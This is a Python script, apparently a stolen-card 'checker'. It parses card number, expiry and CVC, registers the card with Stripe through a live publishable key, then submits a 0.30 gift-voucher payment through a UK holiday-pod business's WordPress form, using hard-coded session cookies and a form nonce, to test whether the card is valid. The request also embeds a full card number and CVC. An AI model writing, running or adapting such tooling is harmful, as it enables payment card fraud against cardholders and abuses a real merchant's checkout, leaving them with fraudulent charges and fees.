import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = 'type=card&card[number]=5284973003220104&card[cvc]=642&card[exp_month]=06&card[exp_year]=25&payment_user_agent=stripe.js%2F560413f346%3B+stripe-js-v3%2F560413f346%3B+card-element&key=pk_live_51NwltJAVtXstrQNhoFxJFcNdvOONIMSspdLDZrDkgWCJ1CGGgzljDyJZQ64YPDZFmx7G2QB4OB0mkNMproXHDpsC00mfjRUHNy'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__stripe_mid': '4544600f-4262-4605-a211-890d6dd95f25f11ff9',
	    'mphb_session': 'f7c81c1d0ec4c977a6fb18da238ae595%7C%7C1744968092%7C%7C1744967732',
	    '__stripe_sid': 'bdf4e3b0-b9d3-4813-be89-28cd4d1a91b67fc797',
	}
	
	headers = {
	    'authority': 'thehideawaypods.co.uk',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=4544600f-4262-4605-a211-890d6dd95f25f11ff9; mphb_session=f7c81c1d0ec4c977a6fb18da238ae595%7C%7C1744968092%7C%7C1744967732; __stripe_sid=bdf4e3b0-b9d3-4813-be89-28cd4d1a91b67fc797',
	    'origin': 'https://thehideawaypods.co.uk',
	    'referer': 'https://thehideawaypods.co.uk/gift-vouchers/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1744966378511',
	}
	
	data = 'data=__fluent_form_embded_post_id%3D1430%26_fluentform_4_fluentformnonce%3Ded90cc54c8%26_wp_http_referer%3D%252Fgift-vouchers%252F%26names%255Bfirst_name%255D%3DRodam%26names%255Blast_name%255D%3DUser%26email%3Drodamuser08%2540gmail.com%26input_text%3DAdmin%26custom-payment-amount%3D0.30%26payment_input%255B%255D%3DSend%2520me%2520an%2520e-Voucher%2520(Free!)%26hidden_1%3D-04-25%26hidden%3DYCV18143004-%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=4'
	
	r2 = requests.post(
	    'https://thehideawaypods.co.uk/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
	

